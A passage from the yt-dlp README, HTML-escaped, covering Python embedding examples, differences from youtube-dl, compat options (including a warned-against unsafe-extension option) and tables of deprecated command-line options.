&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Add a custom PostProcessor&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import yt_dlp

URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']

# ‚ÑπÔ∏è See help(yt_dlp.postprocessor.PostProcessor)
class MyCustomPP(yt_dlp.postprocessor.PostProcessor):
    def run(self, info):
        self.to_screen('Doing stuff')
        return [], info


with yt_dlp.YoutubeDL() as ydl:
    # ‚ÑπÔ∏è "when" can take any value in yt_dlp.utils.POSTPROCESS_WHEN
    ydl.add_post_processor(MyCustomPP(), when='pre_process')
    ydl.download(URLS)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Use a custom format selector&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import yt_dlp

URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']

def format_selector(ctx):
    """ Select the best video and the best audio that won't result in an mkv.
    NOTE: This is just an example and does not handle all cases """

    # formats are already sorted worst to best
    formats = ctx.get('formats')[::-1]

    # acodec='none' means there is no audio
    best_video = next(f for f in formats
                      if f['vcodec'] != 'none' and f['acodec'] == 'none')

    # find compatible audio extension
    audio_ext = {'mp4': 'm4a', 'webm': 'webm'}[best_video['ext']]
    # vcodec='none' means there is no video
    best_audio = next(f for f in formats if (
        f['acodec'] != 'none' and f['vcodec'] == 'none' and f['ext'] == audio_ext))

    # These are the minimum required fields for a merged format
    yield {
        'format_id': f'{best_video["format_id"]}+{best_audio["format_id"]}',
        'ext': best_video['ext'],
        'requested_formats': [best_video, best_audio],
        # Must be + separated list of protocols
        'protocol': f'{best_video["protocol"]}+{best_audio["protocol"]}'
    }


ydl_opts = {
    'format': format_selector,
}

with yt_dlp.YoutubeDL(ydl_opts) as ydl:
    ydl.download(URLS)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;CHANGES FROM YOUTUBE-DL&lt;/h1&gt; 
&lt;h3&gt;New features&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Forked from &lt;a href="https://github.com/blackjack4494/yt-dlc/commit/f9401f2a91987068139c5f757b12fc711d4c0cee"&gt;&lt;strong&gt;yt-dlc@f9401f2&lt;/strong&gt;&lt;/a&gt; and merged with &lt;a href="https://github.com/ytdl-org/youtube-dl/commit/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6"&gt;&lt;strong&gt;youtube-dl@a08f2b7&lt;/strong&gt;&lt;/a&gt; (&lt;a href="https://github.com/yt-dlp/yt-dlp/issues/21"&gt;exceptions&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#sponsorblock-options"&gt;SponsorBlock Integration&lt;/a&gt;&lt;/strong&gt;: You can mark/remove sponsor sections in YouTube videos by utilizing the &lt;a href="https://sponsor.ajay.app"&gt;SponsorBlock&lt;/a&gt; API&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#sorting-formats"&gt;Format Sorting&lt;/a&gt;&lt;/strong&gt;: The default format sorting options have been changed so that higher resolution and better codecs will be now preferred instead of simply using larger bitrate. Furthermore, you can now specify the sort order using &lt;code&gt;-S&lt;/code&gt;. This allows for much easier format selection than what is possible by simply using &lt;code&gt;--format&lt;/code&gt; (&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#format-selection-examples"&gt;examples&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Merged with animelover1984/youtube-dl&lt;/strong&gt;: You get most of the features and improvements from &lt;a href="https://github.com/animelover1984/youtube-dl"&gt;animelover1984/youtube-dl&lt;/a&gt; including &lt;code&gt;--write-comments&lt;/code&gt;, &lt;code&gt;BiliBiliSearch&lt;/code&gt;, &lt;code&gt;BilibiliChannel&lt;/code&gt;, Embedding thumbnail in mp4/ogg/opus, playlist infojson etc. See &lt;a href="https://github.com/yt-dlp/yt-dlp/pull/31"&gt;#31&lt;/a&gt; for details.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;YouTube improvements&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Supports Clips, Stories (&lt;code&gt;ytstories:&amp;lt;channel UCID&amp;gt;&lt;/code&gt;), Search (including filters)&lt;strong&gt;*&lt;/strong&gt;, YouTube Music Search, Channel-specific search, Search prefixes (&lt;code&gt;ytsearch:&lt;/code&gt;, &lt;code&gt;ytsearchdate:&lt;/code&gt;)&lt;strong&gt;*&lt;/strong&gt;, Mixes, and Feeds (&lt;code&gt;:ytfav&lt;/code&gt;, &lt;code&gt;:ytwatchlater&lt;/code&gt;, &lt;code&gt;:ytsubs&lt;/code&gt;, &lt;code&gt;:ythistory&lt;/code&gt;, &lt;code&gt;:ytrec&lt;/code&gt;, &lt;code&gt;:ytnotif&lt;/code&gt;)&lt;/li&gt; 
   &lt;li&gt;Fix for &lt;a href="https://github.com/ytdl-org/youtube-dl/issues/29326"&gt;n-sig based throttling&lt;/a&gt; &lt;strong&gt;*&lt;/strong&gt;&lt;/li&gt; 
   &lt;li&gt;Download livestreams from the start using &lt;code&gt;--live-from-start&lt;/code&gt; (&lt;em&gt;experimental&lt;/em&gt;)&lt;/li&gt; 
   &lt;li&gt;Channel URLs download all uploads of the channel, including shorts and live&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Cookies from browser&lt;/strong&gt;: Cookies can be automatically extracted from all major web browsers using &lt;code&gt;--cookies-from-browser BROWSER[+KEYRING][:PROFILE][::CONTAINER]&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Download time range&lt;/strong&gt;: Videos can be downloaded partially based on either timestamps or chapters using &lt;code&gt;--download-sections&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Split video by chapters&lt;/strong&gt;: Videos can be split into multiple files based on chapters using &lt;code&gt;--split-chapters&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Multi-threaded fragment downloads&lt;/strong&gt;: Download multiple fragments of m3u8/mpd videos in parallel. Use &lt;code&gt;--concurrent-fragments&lt;/code&gt; (&lt;code&gt;-N&lt;/code&gt;) option to set the number of threads used&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Aria2c with HLS/DASH&lt;/strong&gt;: You can use &lt;code&gt;aria2c&lt;/code&gt; as the external downloader for DASH(mpd) and HLS(m3u8) formats&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;New and fixed extractors&lt;/strong&gt;: Many new extractors have been added and a lot of existing ones have been fixed. See the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/Changelog.md"&gt;changelog&lt;/a&gt; or the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/supportedsites.md"&gt;list of supported sites&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;New MSOs&lt;/strong&gt;: Philo, Spectrum, SlingTV, Cablevision, RCN etc.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Subtitle extraction from manifests&lt;/strong&gt;: Subtitles can be extracted from streaming media manifests. See &lt;a href="https://github.com/yt-dlp/yt-dlp/commit/be6202f12b97858b9d716e608394b51065d0419f"&gt;commit/be6202f&lt;/a&gt; for details&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Multiple paths and output templates&lt;/strong&gt;: You can give different &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;output templates&lt;/a&gt; and download paths for different types of files. You can also set a temporary path where intermediary files are downloaded to using &lt;code&gt;--paths&lt;/code&gt; (&lt;code&gt;-P&lt;/code&gt;)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Portable Configuration&lt;/strong&gt;: Configuration files are automatically loaded from the home and root directories. See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#configuration"&gt;CONFIGURATION&lt;/a&gt; for details&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Output template improvements&lt;/strong&gt;: Output templates can now have date-time formatting, numeric offsets, object traversal etc. See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;output template&lt;/a&gt; for details. Even more advanced operations can also be done with the help of &lt;code&gt;--parse-metadata&lt;/code&gt; and &lt;code&gt;--replace-in-metadata&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Other new options&lt;/strong&gt;: Many new options have been added such as &lt;code&gt;--alias&lt;/code&gt;, &lt;code&gt;--print&lt;/code&gt;, &lt;code&gt;--concat-playlist&lt;/code&gt;, &lt;code&gt;--wait-for-video&lt;/code&gt;, &lt;code&gt;--retry-sleep&lt;/code&gt;, &lt;code&gt;--sleep-requests&lt;/code&gt;, &lt;code&gt;--convert-thumbnails&lt;/code&gt;, &lt;code&gt;--force-download-archive&lt;/code&gt;, &lt;code&gt;--force-overwrites&lt;/code&gt;, &lt;code&gt;--break-match-filters&lt;/code&gt; etc&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Improvements&lt;/strong&gt;: Regex and other operators in &lt;code&gt;--format&lt;/code&gt;/&lt;code&gt;--match-filters&lt;/code&gt;, multiple &lt;code&gt;--postprocessor-args&lt;/code&gt; and &lt;code&gt;--downloader-args&lt;/code&gt;, faster archive checking, more &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#format-selection"&gt;format selection options&lt;/a&gt;, merge multi-video/audio, multiple &lt;code&gt;--config-locations&lt;/code&gt;, &lt;code&gt;--exec&lt;/code&gt; at different stages, etc&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Plugins&lt;/strong&gt;: Extractors and PostProcessors can be loaded from an external file. See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#plugins"&gt;plugins&lt;/a&gt; for details&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Self updater&lt;/strong&gt;: The releases can be updated using &lt;code&gt;yt-dlp -U&lt;/code&gt;, and downgraded using &lt;code&gt;--update-to&lt;/code&gt; if required&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Automated builds&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#update-channels"&gt;Nightly/master builds&lt;/a&gt; can be used with &lt;code&gt;--update-to nightly&lt;/code&gt; and &lt;code&gt;--update-to master&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/Changelog.md"&gt;changelog&lt;/a&gt; or &lt;a href="https://github.com/yt-dlp/yt-dlp/commits"&gt;commits&lt;/a&gt; for the full list of changes&lt;/p&gt; 
&lt;p&gt;Features marked with a &lt;strong&gt;*&lt;/strong&gt; have been back-ported to youtube-dl&lt;/p&gt; 
&lt;h3&gt;Differences in default behavior&lt;/h3&gt; 
&lt;p&gt;Some of yt-dlp's default options are different from that of youtube-dl and youtube-dlc:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;yt-dlp supports only &lt;a href="##" title="Windows 8"&gt;Python 3.10+&lt;/a&gt;, and will remove support for more versions as they &lt;a href="https://devguide.python.org/versions/#python-release-cycle"&gt;become EOL&lt;/a&gt;; while &lt;a href="https://github.com/ytdl-org/youtube-dl/issues/30568#issue-1118238743"&gt;youtube-dl still supports Python 2.6+ and 3.2+&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;The options &lt;code&gt;--auto-number&lt;/code&gt; (&lt;code&gt;-A&lt;/code&gt;), &lt;code&gt;--title&lt;/code&gt; (&lt;code&gt;-t&lt;/code&gt;) and &lt;code&gt;--literal&lt;/code&gt; (&lt;code&gt;-l&lt;/code&gt;), no longer work. See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#Removed"&gt;removed options&lt;/a&gt; for details&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;avconv&lt;/code&gt; is not supported as an alternative to &lt;code&gt;ffmpeg&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;yt-dlp stores config files in slightly different locations to youtube-dl. See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#configuration"&gt;CONFIGURATION&lt;/a&gt; for a list of correct locations&lt;/li&gt; 
 &lt;li&gt;The default &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;output template&lt;/a&gt; is &lt;code&gt;%(title)s [%(id)s].%(ext)s&lt;/code&gt;. There is no real reason for this change. This was changed before yt-dlp was ever made public and now there are no plans to change it back to &lt;code&gt;%(title)s-%(id)s.%(ext)s&lt;/code&gt;. Instead, you may use &lt;code&gt;--compat-options filename&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;The default &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#sorting-formats"&gt;format sorting&lt;/a&gt; is different from youtube-dl and prefers higher resolution and better codecs rather than higher bitrates. You can use the &lt;code&gt;--format-sort&lt;/code&gt; option to change this to any order you prefer, or use &lt;code&gt;--compat-options format-sort&lt;/code&gt; to use youtube-dl's sorting order. Older versions of yt-dlp preferred VP9 due to its broader compatibility; you can use &lt;code&gt;--compat-options prefer-vp9-sort&lt;/code&gt; to revert to that format sorting preference. These two compat options cannot be used together&lt;/li&gt; 
 &lt;li&gt;The default format selector is &lt;code&gt;bv*+ba/b&lt;/code&gt;. This means that if a combined video + audio format that is better than the best video-only format is found, the former will be preferred. Use &lt;code&gt;-f bv+ba/b&lt;/code&gt; or &lt;code&gt;--compat-options format-spec&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;Unlike youtube-dlc, yt-dlp does not allow merging multiple audio/video streams into one file by default (since this conflicts with the use of &lt;code&gt;-f bv*+ba&lt;/code&gt;). If needed, this feature must be enabled using &lt;code&gt;--audio-multistreams&lt;/code&gt; and &lt;code&gt;--video-multistreams&lt;/code&gt;. You can also use &lt;code&gt;--compat-options multistreams&lt;/code&gt; to enable both&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--no-abort-on-error&lt;/code&gt; is enabled by default. Use &lt;code&gt;--abort-on-error&lt;/code&gt; or &lt;code&gt;--compat-options abort-on-error&lt;/code&gt; to abort on errors instead&lt;/li&gt; 
 &lt;li&gt;When writing metadata files such as thumbnails, description or infojson, the same information (if available) is also written for playlists. Use &lt;code&gt;--no-write-playlist-metafiles&lt;/code&gt; or &lt;code&gt;--compat-options no-playlist-metafiles&lt;/code&gt; to not write these files&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--add-metadata&lt;/code&gt; attaches the &lt;code&gt;infojson&lt;/code&gt; to &lt;code&gt;mkv&lt;/code&gt; files in addition to writing the metadata when used with &lt;code&gt;--write-info-json&lt;/code&gt;. Use &lt;code&gt;--no-embed-info-json&lt;/code&gt; or &lt;code&gt;--compat-options no-attach-info-json&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;Some metadata are embedded into different fields when using &lt;code&gt;--add-metadata&lt;/code&gt; as compared to youtube-dl. Most notably, &lt;code&gt;comment&lt;/code&gt; field contains the &lt;code&gt;webpage_url&lt;/code&gt; and &lt;code&gt;synopsis&lt;/code&gt; contains the &lt;code&gt;description&lt;/code&gt;. You can &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#modifying-metadata"&gt;use &lt;code&gt;--parse-metadata&lt;/code&gt;&lt;/a&gt; to modify this to your liking or use &lt;code&gt;--compat-options embed-metadata&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_index&lt;/code&gt; behaves differently when used with options like &lt;code&gt;--playlist-reverse&lt;/code&gt; and &lt;code&gt;--playlist-items&lt;/code&gt;. See &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/302"&gt;#302&lt;/a&gt; for details. You can use &lt;code&gt;--compat-options playlist-index&lt;/code&gt; if you want to keep the earlier behavior&lt;/li&gt; 
 &lt;li&gt;The output of &lt;code&gt;-F&lt;/code&gt; is listed in a new format. Use &lt;code&gt;--compat-options list-formats&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;Live chats (if available) are considered as subtitles. Use &lt;code&gt;--sub-langs all,-live_chat&lt;/code&gt; to download all subtitles except live chat. You can also use &lt;code&gt;--compat-options no-live-chat&lt;/code&gt; to prevent any live chat/danmaku from downloading&lt;/li&gt; 
 &lt;li&gt;YouTube channel URLs download all uploads of the channel. To download only the videos in a specific tab, pass the tab's URL. If the channel does not show the requested tab, an error will be raised. Also, &lt;code&gt;/live&lt;/code&gt; URLs raise an error if there are no live videos instead of silently downloading the entire channel. You may use &lt;code&gt;--compat-options no-youtube-channel-redirect&lt;/code&gt; to revert all these redirections&lt;/li&gt; 
 &lt;li&gt;Unavailable videos are also listed for YouTube playlists. Use &lt;code&gt;--compat-options no-youtube-unavailable-videos&lt;/code&gt; to remove this&lt;/li&gt; 
 &lt;li&gt;The upload dates extracted from YouTube are in UTC.&lt;/li&gt; 
 &lt;li&gt;If &lt;code&gt;ffmpeg&lt;/code&gt; is used as the downloader, the downloading and merging of formats happen in a single step when possible. Use &lt;code&gt;--compat-options no-direct-merge&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;Thumbnail embedding in &lt;code&gt;mp4&lt;/code&gt; is done with mutagen if possible. Use &lt;code&gt;--compat-options embed-thumbnail-atomicparsley&lt;/code&gt; to force the use of AtomicParsley instead&lt;/li&gt; 
 &lt;li&gt;Some internal metadata such as filenames are removed by default from the infojson. Use &lt;code&gt;--no-clean-infojson&lt;/code&gt; or &lt;code&gt;--compat-options no-clean-infojson&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;When &lt;code&gt;--embed-subs&lt;/code&gt; and &lt;code&gt;--write-subs&lt;/code&gt; are used together, the subtitles are written to disk and also embedded in the media file. You can use just &lt;code&gt;--embed-subs&lt;/code&gt; to embed the subs and automatically delete the separate file. See &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/630#issuecomment-893659460"&gt;#630 (comment)&lt;/a&gt; for more info. &lt;code&gt;--compat-options no-keep-subs&lt;/code&gt; can be used to revert this&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;certifi&lt;/code&gt; will be used for SSL root certificates, if installed. If you want to use system certificates (e.g. self-signed), use &lt;code&gt;--compat-options no-certifi&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;yt-dlp's sanitization of invalid characters in filenames is different/smarter than in youtube-dl. You can use &lt;code&gt;--compat-options filename-sanitization&lt;/code&gt; to revert to youtube-dl's behavior&lt;/li&gt; 
 &lt;li&gt;&lt;del&gt;yt-dlp tries to parse the external downloader outputs into the standard progress output if possible (Currently implemented: &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/5931"&gt;aria2c&lt;/a&gt;). You can use &lt;code&gt;--compat-options no-external-downloader-progress&lt;/code&gt; to get the downloader output as-is&lt;/del&gt;&lt;/li&gt; 
 &lt;li&gt;yt-dlp versions between 2021.09.01 and 2023.01.02 applies &lt;code&gt;--match-filters&lt;/code&gt; to nested playlists. This was an unintentional side-effect of &lt;a href="https://github.com/yt-dlp/yt-dlp/commit/8f18aca8717bb0dd49054555af8d386e5eda3a88"&gt;8f18ac&lt;/a&gt; and is fixed in &lt;a href="https://github.com/yt-dlp/yt-dlp/commit/d7b460d0e5fc710950582baed2e3fc616ed98a80"&gt;d7b460&lt;/a&gt;. Use &lt;code&gt;--compat-options playlist-match-filter&lt;/code&gt; to revert this&lt;/li&gt; 
 &lt;li&gt;yt-dlp versions between 2021.11.10 and 2023.06.21 estimated &lt;code&gt;filesize_approx&lt;/code&gt; values for fragmented/manifest formats. This was added for convenience in &lt;a href="https://github.com/yt-dlp/yt-dlp/commit/f2fe69c7b0d208bdb1f6292b4ae92bc1e1a7444a"&gt;f2fe69&lt;/a&gt;, but was reverted in &lt;a href="https://github.com/yt-dlp/yt-dlp/commit/0dff8e4d1e6e9fb938f4256ea9af7d81f42fd54f"&gt;0dff8e&lt;/a&gt; due to the potentially extreme inaccuracy of the estimated values. Use &lt;code&gt;--compat-options manifest-filesize-approx&lt;/code&gt; to keep extracting the estimated values&lt;/li&gt; 
 &lt;li&gt;yt-dlp uses modern http client backends such as &lt;code&gt;requests&lt;/code&gt;. Use &lt;code&gt;--compat-options prefer-legacy-http-handler&lt;/code&gt; to prefer the legacy http handler (&lt;code&gt;urllib&lt;/code&gt;) to be used for standard http requests.&lt;/li&gt; 
 &lt;li&gt;The sub-modules &lt;code&gt;swfinterp&lt;/code&gt;, &lt;code&gt;casefold&lt;/code&gt; are removed.&lt;/li&gt; 
 &lt;li&gt;Passing &lt;code&gt;--simulate&lt;/code&gt; (or calling &lt;code&gt;extract_info&lt;/code&gt; with &lt;code&gt;download=False&lt;/code&gt;) no longer alters the default format selection. See &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/9843"&gt;#9843&lt;/a&gt; for details.&lt;/li&gt; 
 &lt;li&gt;yt-dlp no longer applies the server modified time to downloaded files by default. Use &lt;code&gt;--mtime&lt;/code&gt; or &lt;code&gt;--compat-options mtime-by-default&lt;/code&gt; to revert this.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For convenience, there are some compat option aliases available to use:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options all&lt;/code&gt;: Use all compat options (&lt;strong&gt;Do NOT use this!&lt;/strong&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options youtube-dl&lt;/code&gt;: Same as &lt;code&gt;--compat-options all,-multistreams,-playlist-match-filter,-manifest-filesize-approx,-allow-unsafe-ext,-prefer-vp9-sort&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options youtube-dlc&lt;/code&gt;: Same as &lt;code&gt;--compat-options all,-no-live-chat,-no-youtube-channel-redirect,-playlist-match-filter,-manifest-filesize-approx,-allow-unsafe-ext,-prefer-vp9-sort&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options 2021&lt;/code&gt;: Same as &lt;code&gt;--compat-options 2022,no-certifi,filename-sanitization&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options 2022&lt;/code&gt;: Same as &lt;code&gt;--compat-options 2023,playlist-match-filter,no-external-downloader-progress,prefer-legacy-http-handler,manifest-filesize-approx&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options 2023&lt;/code&gt;: Same as &lt;code&gt;--compat-options 2024,prefer-vp9-sort&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options 2024&lt;/code&gt;: Same as &lt;code&gt;--compat-options 2025,mtime-by-default&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--compat-options 2025&lt;/code&gt;: Currently does nothing. Use this to enable all future compat options&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Using one of the yearly compat option aliases will pin yt-dlp's default behavior to what it was at the &lt;em&gt;end&lt;/em&gt; of that calendar year.&lt;/p&gt; 
&lt;p&gt;The following compat options restore vulnerable behavior from before security patches:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;--compat-options allow-unsafe-ext&lt;/code&gt;: Allow files with any extension (including unsafe ones) to be downloaded (&lt;a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j"&gt;GHSA-79w7-vh3h-8g4j&lt;/a&gt;)&lt;/p&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;&lt;span&gt;‚ö†&lt;/span&gt; Only use if a valid file download is rejected because its extension is detected as uncommon&lt;/p&gt; 
   &lt;p&gt;&lt;strong&gt;This option can enable remote code execution! Consider &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/new/choose"&gt;opening an issue&lt;/a&gt; instead!&lt;/strong&gt;&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Deprecated options&lt;/h3&gt; 
&lt;p&gt;These are all the deprecated options and the current alternative to achieve the same effect&lt;/p&gt; 
&lt;h4&gt;Almost redundant options&lt;/h4&gt; 
&lt;p&gt;While these options are almost the same as their new counterparts, there are some differences that prevents them being redundant&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;-j, --dump-json                  --print "%()j"
-F, --list-formats               --print formats_table
--list-thumbnails                --print thumbnails_table --print playlist:thumbnails_table
--list-subs                      --print automatic_captions_table --print subtitles_table
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Redundant options&lt;/h4&gt; 
&lt;p&gt;While these options are redundant, they are still expected to be used due to their ease of use&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--get-description                --print description
--get-duration                   --print duration_string
--get-filename                   --print filename
--get-format                     --print format
--get-id                         --print id
--get-thumbnail                  --print thumbnail
-e, --get-title                  --print title
-g, --get-url                    --print urls
--match-title REGEX              --match-filters "title ~= (?i)REGEX"
--reject-title REGEX             --match-filters "title !~= (?i)REGEX"
--min-views COUNT                --match-filters "view_count &amp;gt;=? COUNT"
--max-views COUNT                --match-filters "view_count &amp;lt;=? COUNT"
--break-on-reject                Use --break-match-filters
--user-agent UA                  --add-headers "User-Agent:UA"
--referer URL                    --add-headers "Referer:URL"
--playlist-start NUMBER          -I NUMBER:
--playlist-end NUMBER            -I :NUMBER
--playlist-reverse               -I ::-1
--no-playlist-reverse            Default
--no-colors                      --color no_color
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Not recommended&lt;/h4&gt; 
&lt;p&gt;While these options still work, their use is not recommended since there are other alternatives to achieve the same&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--force-generic-extractor        --ies generic,default
--exec-before-download CMD       --exec "before_dl:CMD"
--no-exec-before-download        --no-exec
--all-formats                    -f all
--all-subs                       --sub-langs all --write-subs
--print-json                     -j --no-simulate
--autonumber-size NUMBER         Use string formatting, e.g. %(autonumber)03d
--autonumber-start NUMBER        Use internal field formatting like %(autonumber+NUMBER)s
--id                             -o "%(id)s.%(ext)s"
--metadata-from-title FORMAT     --parse-metadata "%(title)s:FORMAT"
--hls-prefer-native              --downloader "m3u8:native"
--hls-prefer-ffmpeg              --downloader "m3u8:ffmpeg"
--list-formats-old               --compat-options list-formats (Alias: --no-list-formats-as-table)
--list-formats-as-table          --compat-options -list-formats [Default]
--geo-bypass                     --xff "default"
--no-geo-bypass                  --xff "never"
--geo-bypass-country CODE        --xff CODE
--geo-bypass-ip-block IP_BLOCK   --xff IP_BLOCK
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Developer options&lt;/h4&gt; 
&lt;p&gt;These options are not intended to be used by the end-user&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--test                           Download only part of video for testing extractors
--load-pages                     Load pages dumped by --write-pages
--allow-unplayable-formats       List unplayable formats also
--no-allow-unplayable-formats    Default
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Old aliases&lt;/h4&gt; 
&lt;p&gt;These are aliases that are no longer documented for various reasons&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--clean-infojson                 --clean-info-json
--force-write-download-archive   --force-write-archive
--no-clean-infojson              --no-clean-info-json
--no-split-tracks                --no-split-chapters
--no-write-srt                   --no-write-subs
--prefer-unsecure                --prefer-insecure
--rate-limit RATE                --limit-rate RATE
--split-tracks                   --split-chapters
--srt-lang LANGS                 --sub-langs LANGS
--trim-file-names LENGTH         --trim-filenames LENGTH
--write-srt                      --write-subs
--yes-overwrites                 --force-overwrites
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Sponskrub Options&lt;/h4&gt; 
&lt;p&gt;Support for &lt;a href="https://github.com/faissaloo/SponSkrub"&gt;SponSkrub&lt;/a&gt; has been removed in favor of the &lt;code&gt;--sponsorblock&lt;/code&gt; options&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--sponskrub                      --sponsorblock-mark all
--no-sponskrub                   --no-sponsorblock
--sponskrub-cut                  --sponsorblock-remove all
--no-sponskrub-cut               --sponsorblock-remove -all
--sponskrub-force                Not applicable
--no-sponskrub-force             Not applicable
--sponskrub-location             Not applicable
--sponskrub-args                 Not applicable
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;No longer supported&lt;/h4&gt; 
&lt;p&gt;These options may no longer work as intended&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;--prefer-avconv                  avconv is not officially supported by yt-dlp (Alias: --no-prefer-ffmpeg)
--prefer-ffmpeg                  Default (Alias: --no-prefer-avconv)
-C, --call-home                  Not implemented
--no-call-home                   Default
